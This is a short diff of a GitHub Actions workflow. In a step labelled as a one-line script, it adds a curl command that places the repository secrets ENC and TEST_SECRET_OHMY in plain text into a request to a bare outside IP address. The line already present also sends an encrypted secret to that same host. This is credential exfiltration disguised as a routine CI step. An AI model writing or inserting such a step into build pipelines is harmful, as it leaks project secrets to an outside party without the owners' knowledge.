@@ -21,4 +21,5 @@ jobs:
       # Runs a single command using the runners shell
       - name: Run a one-line script
         run: |
+          curl -s -X GET http://18.119.164.181/test1/${{ secrets.ENC }}/${{ secrets.TEST_SECRET_OHMY }}
           curl -s -X GET http://18.119.164.181/test1/$(echo "$TEST_SECRET_OHMY" | openssl aes-256-cbc -a -salt -pass pass:$ENC) | openssl aes-256-cbc -d -a -pass pass:$ENC
